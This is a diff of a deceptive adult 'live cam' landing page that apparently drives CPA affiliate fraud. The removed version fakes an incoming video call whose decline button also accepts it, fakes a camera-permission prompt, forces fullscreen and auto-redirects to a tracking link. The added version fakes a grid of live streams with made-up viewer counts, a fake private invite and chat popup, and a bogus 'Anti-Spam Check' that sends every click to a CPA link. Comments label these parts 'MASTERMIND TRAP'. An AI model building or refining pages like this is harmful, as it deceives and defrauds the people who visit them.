@@ -3,229 +3,267 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Instant Videochat - Live</title>
+    <title>Live Connect - Join Free</title>
     
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; user-select: none; }
-        
-        body { background-color: #5b0a29; color: #ffffff; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; user-select: none; }
+        body { background-color: #1a1a1c; color: #ffffff; overflow-x: hidden; }
 
-        /* --- NAVBAR --- */
-        .navbar { background-color: #000000; padding: 12px 20px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #1a1a1a; z-index: 50; }
-        .left-nav { display: flex; align-items: center; gap: 15px; }
-        .hamburger { display: flex; flex-direction: column; gap: 5px; cursor: pointer; padding: 5px; }
-        .hamburger span { width: 22px; height: 2px; background-color: #ddd; }
-        .logo { display: flex; align-items: center; gap: 8px; font-weight: 900; font-size: 19px; line-height: 1; letter-spacing: -0.5px; }
-        .logo-icon { background-color: #ff1269; color: white; width: 34px; height: 26px; border-radius: 8px; position: relative; display: flex; justify-content: center; align-items: center; font-size: 18px; font-weight: bold; font-style: italic; transform: skewX(-10deg); }
-        .logo-icon::after { content: ''; position: absolute; right: -8px; top: 5px; width: 8px; height: 16px; background-color: #ff1269; border-radius: 3px; transform: skewX(10deg); }
+        /* --- UI FROM IMAGE --- */
+        .top-banner {
+            background-color: #8bc34a; color: #fff; text-align: center; padding: 8px;
+            font-size: 15px; font-weight: bold; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 10px;
+        }
         
-        .right-nav { display: flex; align-items: center; gap: 30px; }
-        .nav-icons { display: flex; gap: 25px; font-size: 11px; color: #777; text-align: center; font-weight: 500; }
-        .nav-item { display: flex; flex-direction: column; align-items: center; gap: 6px; cursor: pointer; }
-        .nav-item i { font-size: 22px; font-style: normal; }
-        .nav-item.active { color: #fff; }
-        .login-btn { border: 1px solid #555; padding: 8px 25px; border-radius: 25px; font-size: 14px; font-weight: bold; cursor: pointer; color: #fff; }
+        .navbar {
+            background-color: #111111; padding: 10px 20px; display: flex; align-items: center; justify-content: space-between;
+            border-bottom: 1px solid #2a2a2a; flex-wrap: wrap; gap: 10px; position: sticky; top: 0; z-index: 50;
+        }
+        
+        .logo { font-size: 24px; font-weight: 900; display: flex; align-items: center; letter-spacing: -1px; }
+        .logo span:nth-child(1) { color: #ff2a7a; }
+        .logo span:nth-child(2) { color: #42a5f5; }
+        
+        .nav-links { display: flex; gap: 20px; align-items: center; overflow-x: auto; scrollbar-width: none; }
+        .nav-item { display: flex; align-items: center; gap: 5px; color: #ccc; font-size: 14px; text-decoration: none; cursor: pointer; transition: color 0.3s; white-space: nowrap; }
+        .nav-item:hover, .nav-item.active { color: #ff2a7a; }
+        .nav-icon { font-size: 16px; color: #ff2a7a; }
+        
+        .search-bar {
+            background: #fff; border-radius: 4px; padding: 6px 12px; display: flex; align-items: center; gap: 8px; width: 100%; max-width: 250px;
+        }
+        .search-bar input { border: none; outline: none; width: 100%; font-size: 13px; color: #333; }
+        .search-icon { color: #999; font-size: 14px; }
 
-        /* --- MAIN DASHBOARD --- */
-        .main-area { flex: 1; position: relative; display: flex; flex-direction: column; align-items: center; padding-top: 50px; transition: filter 0.3s ease; }
+        /* --- THE GUEST BAR --- */
+        .guest-bar {
+            background: #222; padding: 10px 20px; display: flex; justify-content: space-between; align-items: center;
+            font-size: 13px; border-bottom: 2px solid #8bc34a; box-shadow: 0 4px 10px rgba(0,0,0,0.5);
+        }
+        .guest-id-text { color: #8bc34a; font-weight: 900; font-size: 15px; letter-spacing: 1px; }
         
-        .gender-selector { background: rgba(0,0,0,0.5); border: 1px solid #333; border-radius: 40px; display: flex; align-items: center; padding: 5px; gap: 5px; margin-bottom: 50px; width: 90%; max-width: 400px; justify-content: space-between; }
-        .g-option { display: flex; align-items: center; gap: 8px; padding: 12px 15px; border-radius: 30px; font-size: 13px; font-weight: bold; cursor: pointer; color: #888; flex: 1; justify-content: center; }
-        .g-option.active { background: rgba(255,255,255,0.1); color: #fff; }
+        /* --- MAIN CONTENT --- */
+        .dashboard { transition: filter 0.3s; padding-bottom: 50px; }
+        .dashboard.blurred { filter: blur(12px); pointer-events: none; }
 
-        .radar-box { position: relative; width: 120px; height: 120px; display: flex; justify-content: center; align-items: center; margin-bottom: 20px; }
-        .radar-pulse { position: absolute; width: 100%; height: 100%; border-radius: 50%; border: 3px solid #ff1269; animation: pulseRadar 1.5s infinite ease-out; }
-        .radar-pulse:nth-child(2) { animation-delay: 0.4s; }
-        @keyframes pulseRadar { 0% { transform: scale(0.5); opacity: 1; } 100% { transform: scale(2.5); opacity: 0; } }
+        .cam-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 4px; padding: 4px; }
+        .cam-card { position: relative; height: 280px; overflow: hidden; cursor: pointer; background: #000; }
+        .cam-img { width: 100%; height: 100%; object-fit: cover; transition: transform 0.4s; }
+        .cam-card:hover .cam-img { transform: scale(1.05); }
         
-        .status-text { font-size: 18px; font-weight: bold; color: #ff1269; margin-top: 20px; animation: blink 1s infinite; }
-        @keyframes blink { 50% { opacity: 0.5; } }
+        .badge-live { position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.6); color: #fff; font-size: 11px; font-weight: bold; padding: 4px 8px; border-radius: 4px; display: flex; align-items: center; gap: 4px; border: 1px solid rgba(255,255,255,0.2); }
+        .badge-live .dot { width: 8px; height: 8px; background: #ff2a7a; border-radius: 50%; animation: blink 1s infinite; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        
+        .cam-info { position: absolute; bottom: 0; left: 0; width: 100%; padding: 30px 15px 15px; background: linear-gradient(transparent, rgba(0,0,0,0.9)); display: flex; justify-content: space-between; align-items: flex-end; }
+        .cam-name { font-size: 15px; font-weight: bold; color: #fff; display: flex; align-items: center; gap: 5px; }
+        .cam-name span { color: #ff2a7a; font-size: 16px; }
+        .viewers { font-size: 12px; color: #ccc; }
 
-        /* --- STAGE 2: INCOMING CALL SCREEN --- */
-        .incoming-call-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.9); z-index: 200; display: none; flex-direction: column; justify-content: space-between; padding: 50px 20px; text-align: center; }
+        /* --- THE MASTERMIND ADDITIONS --- */
+        .direct-invite-modal {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 400;
+            background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); display: none; justify-content: center; align-items: center; padding: 20px;
+        }
+        .invite-box {
+            background: #111; width: 100%; max-width: 360px; padding: 30px 20px; border-radius: 12px; text-align: center; border: 2px solid #8bc34a; box-shadow: 0 0 40px rgba(139, 195, 74, 0.3); position: relative; animation: slideDown 0.5s;
+        }
+        @keyframes slideDown { 0% { transform: translateY(-50px); opacity: 0; } 100% { transform: translateY(0); opacity: 1; } }
         
-        .caller-info { animation: slideDown 0.5s ease; }
-        @keyframes slideDown { from { transform: translateY(-50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-        .caller-avatar { width: 100px; height: 100px; border-radius: 50%; background: url('https://raw.githubusercontent.com/gdjg536ydiv-bot/affizerp/main/zUhgoTkN_400x400.jpg') center/cover; margin: 0 auto 15px; border: 3px solid #ff1269; box-shadow: 0 0 20px rgba(255,18,105,0.5); }
+        .invite-avatar {
+            width: 100px; height: 100px; border-radius: 50%; margin: -60px auto 15px; border: 4px solid #8bc34a;
+            background: url('https://github.com/gdjg536ydiv-bot/affizerp/blob/main/zUhgoTkN_400x400.jpg?raw=true'); background-size: cover; filter: blur(5px); box-shadow: 0 0 20px rgba(0,0,0,0.8); position: relative;
+        }
+        .invite-lock { position: absolute; bottom: 0; right: 0; background: #ff2a7a; padding: 8px; border-radius: 50%; font-size: 16px; border: 2px solid #111; }
         
-        .call-actions { display: flex; justify-content: space-around; width: 100%; max-width: 300px; margin: 0 auto; padding-bottom: 30px; }
-        .call-btn { width: 70px; height: 70px; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 30px; cursor: pointer; color: white; border: none; outline: none; }
-        .decline-btn { background: #ff3b30; box-shadow: 0 5px 15px rgba(255,59,48,0.4); }
-        .accept-btn { background: #34c759; box-shadow: 0 5px 15px rgba(52,199,89,0.4); animation: shakeCall 1.5s infinite; }
-        @keyframes shakeCall { 0%, 100% { transform: rotate(0deg); } 20% { transform: rotate(15deg); } 40% { transform: rotate(-15deg); } 60% { transform: rotate(10deg); } 80% { transform: rotate(-10deg); } }
+        .invite-title { color: #fff; font-size: 20px; font-weight: 900; margin-bottom: 5px; }
+        .invite-text { color: #aaa; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
+        .invite-text strong { color: #8bc34a; }
+        
+        .accept-invite-btn {
+            background: #8bc34a; color: #000; padding: 15px; border-radius: 30px; font-weight: 900; font-size: 15px; width: 100%; border: none; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 8px; box-shadow: 0 5px 15px rgba(139,195,74,0.4); text-transform: uppercase;
+        }
 
-        /* --- STAGE 3: THE MASTERMIND PERMISSION & CPA TRAP --- */
-        .permission-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(91, 10, 41, 0.85); backdrop-filter: blur(10px); z-index: 300; display: none; justify-content: center; align-items: center; padding: 20px; flex-direction: column; cursor: pointer; }
-        
-        .permission-box { background: #070707; width: 100%; max-width: 380px; border-radius: 16px; padding: 35px 25px; text-align: center; border: 1px solid #222; box-shadow: 0 20px 50px rgba(0,0,0,0.9); position: relative; z-index: 101; animation: popIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
-        @keyframes popIn { 0% { transform: scale(0.8); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+        .floating-chat {
+            position: fixed; bottom: 20px; right: 20px; z-index: 150; display: flex; align-items: center; gap: 10px;
+            background: #111; padding: 8px 15px 8px 8px; border-radius: 40px; border: 1px solid #333;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.8); cursor: pointer; transform: translateY(100px); transition: transform 0.5s;
+        }
+        .floating-chat.show { transform: translateY(0); }
+        .chat-img { width: 45px; height: 45px; border-radius: 50%; object-fit: cover; filter: blur(3px); border: 2px solid #8bc34a; }
+        .chat-text { display: flex; flex-direction: column; }
+        .chat-name { font-size: 12px; font-weight: bold; color: #fff; display: flex; align-items: center; gap: 4px; }
+        .chat-msg { font-size: 12px; color: #8bc34a; font-weight: 600; }
 
-        .cam-icon-large { color: #ff1269; font-size: 50px; margin-bottom: 20px; }
-        .perm-title { font-size: 20px; font-weight: 900; margin-bottom: 15px; color: #fff; letter-spacing: -0.5px; }
-        .perm-desc { font-size: 14px; color: #e0e0e0; line-height: 1.5; margin-bottom: 20px; padding: 0 10px; }
-
-        /* Final CPA Area */
-        .cpa-action-box { display: none; flex-direction: column; align-items: center; animation: popIn 0.3s; width: 100%; }
+        /* --- THE NEW MASTERMIND TRAP (Anti-Spam/Security) --- */
+        .verification-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 500; background: rgba(0,0,0,0.92); display: none; justify-content: center; align-items: center; padding: 20px; }
+        .modal-box { background: #111; width: 100%; max-width: 380px; padding: 35px 25px; border-radius: 16px; text-align: center; border: 1px solid #333; box-shadow: 0 20px 60px rgba(0,0,0,0.5); position: relative; }
+        .guest-badge { position: absolute; top: 0; left: 50%; transform: translateX(-50%); background: #222; color: #8bc34a; font-size: 11px; font-weight: bold; padding: 6px 20px; border-radius: 0 0 10px 10px; border: 1px solid #333; border-top: none; }
         
-        /* The Pre-Frame Message (Key to reduce bounce rate) */
-        .pre-frame-msg { font-size: 13px; color: #ffcc00; background: rgba(255, 204, 0, 0.1); border: 1px solid rgba(255, 204, 0, 0.3); padding: 10px; border-radius: 8px; margin-bottom: 20px; line-height: 1.4; font-weight: bold; text-align: left; }
+        .cpa-btn { background: #8bc34a; color: #000; text-decoration: none; display: block; padding: 18px; border-radius: 4px; font-weight: 900; font-size: 16px; text-transform: uppercase; margin-top: 20px; transition: 0.2s; box-shadow: 0 5px 15px rgba(139,195,74,0.3); }
+        .cpa-btn:active { transform: scale(0.98); }
         
-        .start-free-btn { background: #ffffff; color: #ff1269; text-decoration: none; display: flex; justify-content: center; align-items: center; gap: 12px; padding: 16px 30px; border-radius: 40px; font-weight: 900; font-size: 20px; width: 100%; max-width: 400px; box-shadow: 0 10px 30px rgba(255, 18, 105, 0.4); animation: pulseBtn 1.5s infinite; position: relative; overflow: hidden; }
-        .btn-cam-icon { font-size: 26px; display: flex; align-items: center; }
+        .status-dot { display: inline-block; width: 10px; height: 10px; background-color: #ff2a7a; border-radius: 50%; margin-right: 5px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(255, 42, 122, 0.7); } 70% { transform: scale(1); box-shadow: 0 0 0 10px rgba(255, 42, 122, 0); } 100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(255, 42, 122, 0); } }
 
-        @media (max-width: 768px) { .nav-icons, .login-btn { display: none; } }
+        @media (max-width: 768px) {
+            .search-bar { display: none; }
+            .nav-links { width: 100%; justify-content: space-between; }
+        }
     </style>
 </head>
-<body onclick="requestFullScreen()">
+<body>
 
-    <!-- TOP NAVBAR -->
+    <div class="top-banner" onclick="showVerificationTrap('banner')">
+        <span class="status-dot"></span> Secure Connection: End-to-End Encrypted
+    </div>
+
     <header class="navbar">
-        <div class="left-nav">
-            <div class="hamburger"><span></span><span></span><span></span></div>
-            <div class="logo">
-                <div class="logo-icon">⚡</div>
-                <div>instant<br>videochat</div>
-            </div>
+        <div class="logo">
+            <span>L</span><span>DX</span>
         </div>
-        <div class="right-nav">
-            <div class="nav-icons">
-                <div class="nav-item"><i>🔥</i> Discover</div>
-                <div class="nav-item"><i>♡</i> Followings</div>
-                <div class="nav-item active"><i>📹</i> Search</div>
-                <div class="nav-item"><i>🕒</i> History</div>
-                <div class="nav-item"><i>💬</i> Messages</div>
-            </div>
-            <div class="login-btn">Log In</div>
+        <div class="nav-links">
+            <div class="nav-item active"><span class="nav-icon">🏠</span> Home</div>
+            <div class="nav-item"><span class="nav-icon">♀</span> Women</div>
+            <div class="nav-item"><span class="nav-icon">♂</span> Men</div>
+            <div class="nav-item"><span class="nav-icon">⚥</span> Couples</div>
+            <div class="nav-item"><span class="nav-icon">⚧</span> Trans</div>
+        </div>
+        <div class="search-bar" onclick="showVerificationTrap('search')">
+            <span class="search-icon">🔍</span>
+            <input type="text" placeholder="Find by name, username or location" readonly>
         </div>
     </header>
 
-    <!-- STAGE 1: DASHBOARD / SEARCHING -->
-    <div class="main-area" id="main-bg">
-        <div class="gender-selector">
-            <div class="g-option active" style="color: #ff1269;">♀ Female</div>
-            <div class="g-option" style="color: #42a5f5;">♂ Male</div>
-            <div class="g-option" style="color: #bbb;">⚥ Random Free</div>
-        </div>
-        <div class="radar-box" id="radar">
-            <div class="radar-pulse"></div>
-            <div class="radar-pulse"></div>
-            <div style="font-size: 50px; z-index: 10;">📹</div>
-        </div>
-        <div class="status-text" id="status-text">Locating match near you...</div>
+    <div class="guest-bar">
+        <div>System ID: <span class="guest-id-text" id="my-guest-id">Loading...</span></div>
+        <div style="color: #ff2a7a; font-weight: bold;">Connection Unsecured</div>
     </div>
 
-    <!-- STAGE 2: INCOMING CALL OVERLAY -->
-    <div class="incoming-call-overlay" id="incoming-call">
-        <div class="caller-info">
-            <div class="caller-avatar"></div>
-            <h2 style="font-size: 28px; font-weight: bold; margin-bottom: 5px;">Chloe (19)</h2>
-            <p style="color: #34c759; font-size: 16px; font-weight: bold; animation: blink 1s infinite;">Incoming Video Call...</p>
-        </div>
-        <div class="call-actions">
-            <button class="call-btn decline-btn" onclick="acceptCall()">✖</button> <!-- Even decline accepts it! -->
-            <button class="call-btn accept-btn" onclick="acceptCall()">📞</button>
+    <div class="dashboard" id="dashboard">
+        <div class="cam-grid" id="grid">
+            <div class="cam-card" style="border: 3px solid #8bc34a;" onclick="showVerificationTrap('pinned')">
+                <img src="https://github.com/gdjg536ydiv-bot/affizerp/blob/main/zUhgoTkN_400x400.jpg?raw=true" class="cam-img" style="filter: blur(12px) brightness(0.8);">
+                <div class="badge-live" style="background: #8bc34a; color:#000; border:none;"><span style="font-size:14px;">🔒</span> VIP PRIVATE ROOM</div>
+                
+                <div style="position:absolute; top:50%; left:50%; transform:translate(-50%, -50%); text-align:center; width:100%;">
+                    <div style="font-size:40px; margin-bottom:10px;">💬</div>
+                    <div style="background: rgba(0,0,0,0.8); display:inline-block; padding: 8px 15px; border-radius: 20px; font-weight:bold; color:#8bc34a;">"I'm waiting for you..."</div>
+                </div>
+
+                <div class="cam-info">
+                    <div class="cam-name">Private Match <span>♀</span></div>
+                    <div class="viewers" style="color:#8bc34a; font-weight:bold;">Tap to connect</div>
+                </div>
+            </div>
         </div>
     </div>
 
-    <!-- STAGE 3 & 4: PERMISSION TO CPA TRAP -->
-    <div class="permission-overlay" id="perm-overlay" onclick="showCPABtn()">
-        <div class="permission-box" id="step-1-fake-perm">
-            <div class="cam-icon-large">📹</div>
-            <div id="conn-text" class="perm-title">Connecting to Server...</div>
-            <div id="perm-desc" class="perm-desc">Establishing peer-to-peer encrypted connection. Please wait...</div>
-            <div id="spinner" style="width: 40px; height: 40px; border: 4px solid rgba(255,18,105,0.2); border-top: 4px solid #ff1269; border-radius: 50%; margin: 0 auto; animation: spin 1s linear infinite;"></div>
-            <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
+    <!-- DIRECT INVITE MODAL -->
+    <div class="direct-invite-modal" id="invite-modal">
+        <div class="invite-box">
+            <div class="invite-avatar"><div class="invite-lock">💬</div></div>
+            <div class="invite-title">New Message Received</div>
+            <div class="invite-text">
+                The person you were interacting with has sent you a link to her <strong>Secure Private Room</strong>.<br><br>
+                <span style="color:#ff2a7a; font-size:12px;">End-to-End Encryption Enabled.</span>
+            </div>
+            <button class="accept-invite-btn" onclick="showVerificationTrap('invite')">
+                ENTER PRIVATE ROOM
+            </button>
         </div>
+    </div>
 
-        <div class="cpa-action-box" id="step-2-cpa">
-            <div class="perm-title" style="color: #4caf50;">Connection Secured!</div>
-            
-            <!-- THE BRIDGE MESSAGE (Prevents bouncing) -->
-            <div class="pre-frame-msg">
-                ⚠️ <b>Action Required:</b> To view this private live stream, you must complete a quick FREE verification on the next page (Sponsor Requirement). The video will automatically resume.
-            </div>
+    <!-- FLOATING CHAT WIDGET -->
+    <div class="floating-chat" id="floating-chat" onclick="showVerificationTrap('chat')">
+        <img src="https://github.com/gdjg536ydiv-bot/affizerp/blob/main/zUhgoTkN_400x400.jpg?raw=true" class="chat-img">
+        <div class="chat-text">
+            <span class="chat-name">Hidden_Profile 🔒</span>
+            <span class="chat-msg">Are you coming in? Click here!</span>
+        </div>
+    </div>
 
-            <!-- YOUR CPA LINK -->
-            <a href="https://bedjfha.litracksm.com/s/62b4abc4a39b9" class="start-free-btn" id="final-link">
-                <span class="btn-cam-icon">📹</span> Start Video Chat for FREE
-            </a>
-            
-            <div style="color: #ccc; margin-top: 15px; font-size: 12px; font-weight: bold; display: flex; align-items: center; justify-content: center; gap: 5px;">
-                <span style="display:inline-block; width:8px; height:8px; background:red; border-radius:50%; animation: blink 1s infinite;"></span>
-                Chloe is waiting on cam...
+    <!-- THE NEW MASTERMIND BLOCKER (Anti-Spam / CPA LINK) -->
+    <div class="verification-modal" id="verification-modal">
+        <div class="modal-box">
+            <div class="guest-badge" id="modal-guest-id">GUEST_ID</div>
+            <div style="font-size: 55px; margin-bottom: 10px;">🛡️</div>
+            <div style="font-size: 22px; font-weight: 900; color: #fff; margin-bottom: 15px; letter-spacing:-0.5px;">Anti-Spam Check</div>
+            <div style="font-size: 14px; color: #aaa; line-height: 1.6; margin-bottom: 25px;" id="modal-desc">
+                The user has enabled <b>Anti-Spam protection</b> for this private room.<br><br>
+                Please confirm you are a real person to establish a secure connection.<br>
+                <span style="color:#8bc34a; font-weight:bold; display:block; margin-top:12px;">Verification is 100% Free & takes 30 seconds.</span>
             </div>
+            
+            <!-- NEW CPA LINK -->
+            <a href="https://quicklink.pro/mypersonalvideo80" class="cpa-btn">ACTIVATE FREE GUEST PASS</a>
+            <div style="margin-top: 15px; font-size: 11px; color: #555;">Protected by Cloudflare & SSL</div>
         </div>
     </div>
 
     <script>
-        // FULLSCREEN HACK
-        let isFullscreen = false;
-        function requestFullScreen() {
-            if (!isFullscreen && document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen().catch(err => { console.log("Fullscreen ignored"); });
-                isFullscreen = true;
-            }
-        }
+        const myGuestID = "Connection_" + Math.floor(100000 + Math.random() * 900000);
+        document.getElementById('my-guest-id').innerText = myGuestID;
+        document.getElementById('modal-guest-id').innerText = myGuestID.toUpperCase();
 
-        // START THE MASTERMIND SEQUENCE
-        let ringInterval;
-        setTimeout(() => {
-            // Stop radar, Show Incoming Call
-            document.getElementById('radar').style.display = 'none';
-            document.getElementById('status-text').style.display = 'none';
-            document.getElementById('incoming-call').style.display = 'flex';
-            document.getElementById('main-bg').style.filter = "blur(10px)";
-            
-            // Haptic feedback (Vibrate like a real call)
-            if(navigator.vibrate) {
-                ringInterval = setInterval(() => { navigator.vibrate([500, 200, 500]); }, 1200);
-            }
-        }, 2500);
+        const baseImages = [
+            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/post94873717708903160IMG_2631.jpeg?raw=true",
+            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/photo_2026-02-01_19-40-54.jpg?raw=true",
+            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5faff59e27102.jpeg?raw=true",
+            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5fafd6212320b.jpeg?raw=true",
+            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5fafcae692d2c.jpeg?raw=true",
+            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5fafc930da7d6.jpeg?raw=true",
+            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5fafbe3fc1960.jpeg?raw=true",
+            "https://github.com/gdjg536ydiv-bot/affizerp/blob/main/images_5fafb9e5a7fc5.jpeg?raw=true"
+        ];
+        
+        const grid = document.getElementById('grid');
+        const names = ["amylaaa", "sweet_katy", "bella_xo", "mia_live", "jess_cam", "ruby_red", "candy_crush", "luna_moon"];
 
-        // ACCEPT CALL FUNCTION
-        function acceptCall() {
-            // Stop ringing
-            if(ringInterval) clearInterval(ringInterval);
-            if(navigator.vibrate) navigator.vibrate(0);
+        for (let i = 0; i < 20; i++) {
+            const randomImg = baseImages[Math.floor(Math.random() * baseImages.length)];
+            const randomName = names[Math.floor(Math.random() * names.length)] + Math.floor(Math.random()*99);
+            const viewers = Math.floor(500 + Math.random() * 4000);
             
-            // Hide call screen, show connecting modal
-            document.getElementById('incoming-call').style.display = 'none';
-            document.getElementById('perm-overlay').style.display = 'flex';
-            
-            // Fake Connecting Process... then show camera permission format
-            setTimeout(() => {
-                document.getElementById('conn-text').innerText = "Allow access to your camera and microphone";
-                document.getElementById('perm-desc').innerText = "This app requires access to your camera and microphone so that other people can see and hear you. We'll request access separately for each browser and computer you use.";
-                document.getElementById('spinner').style.display = "none";
-                
-                // Add the dummy 'tap anywhere' circle
-                document.getElementById('step-1-fake-perm').innerHTML += `
-                    <div style="width: 60px; height: 60px; border-radius: 50%; background: rgba(255,255,255,0.1); margin: 20px auto 0; display: flex; justify-content: center; align-items: center; border: 2px solid #333;">
-                        <div style="width: 30px; height: 30px; border-radius: 50%; background: #444;"></div>
+            grid.insertAdjacentHTML('beforeend', `
+                <div class="cam-card" onclick="showVerificationTrap('general')">
+                    <img src="${randomImg}" class="cam-img" loading="lazy">
+                    <div class="badge-live"><div class="dot"></div> LIVE</div>
+                    <div class="cam-info">
+                        <div class="cam-name">${randomName} <span>♀</span></div>
+                        <div class="viewers">👁 ${viewers}</div>
                     </div>
-                `;
-            }, 1500);
+                </div>
+            `);
         }
 
-        // FINAL TRAP: SWITCH TO CPA LINK
-        let trapActivated = false;
-        function showCPABtn() {
-            // Only trigger if the connecting process is done (spinner is hidden)
-            if(document.getElementById('spinner').style.display === "none" && !trapActivated) {
-                trapActivated = true;
-                if(navigator.vibrate) navigator.vibrate(100);
-                
-                // Swap UI
-                document.getElementById('step-1-fake-perm').style.display = 'none';
-                document.getElementById('step-2-cpa').style.display = 'flex';
-                
-                // Auto Redirect if they just stare at it for 5 seconds
-                setTimeout(() => {
-                    window.location.href = "https://bedjfha.litracksm.com/s/62b4abc4a39b9";
-                }, 5000);
-            } else if (trapActivated) {
-                window.location.href = "https://bedjfha.litracksm.com/s/62b4abc4a39b9";
+        setTimeout(() => {
+            document.getElementById('dashboard').classList.add('blurred');
+            document.getElementById('invite-modal').style.display = 'flex';
+            if(navigator.vibrate) navigator.vibrate([200, 100, 200]);
+        }, 3000);
+
+        setTimeout(() => {
+            document.getElementById('floating-chat').classList.add('show');
+        }, 7000);
+
+        function showVerificationTrap(source) {
+            document.getElementById('invite-modal').style.display = 'none';
+            document.getElementById('floating-chat').style.display = 'none';
+            
+            const desc = document.getElementById('modal-desc');
+            
+            // New Psychological Trap Texts
+            if(source === 'invite' || source === 'chat' || source === 'pinned') {
+                desc.innerHTML = `The user has enabled <b>Anti-Spam protection</b> for this private room.<br><br>Please confirm you are a real person to establish a secure connection.<br><span style="color:#8bc34a; font-weight:bold; display:block; margin-top:12px;">Verification is 100% Free & takes 30 seconds.</span>`;
+            } else if (source === 'search') {
+                desc.innerHTML = `Search feature is protected against <b>Bots & Spam</b>.<br><br>Activate your Free Guest Pass to unlock search and connect securely.<br><span style="color:#8bc34a; font-weight:bold; display:block; margin-top:12px;">Verification is 100% Free & takes 30 seconds.</span>`;
+            } else {
+                desc.innerHTML = `Unsecured Connection Detected.<br><br>To view streams and join private rooms, please activate a Free Guest Pass to verify you are a human.<br><span style="color:#8bc34a; font-weight:bold; display:block; margin-top:12px;">Verification is 100% Free & takes 30 seconds.</span>`;
             }
+
+            document.getElementById('dashboard').classList.add('blurred');
+            document.getElementById('verification-modal').style.display = 'flex';
         }
     </script>
 </body>
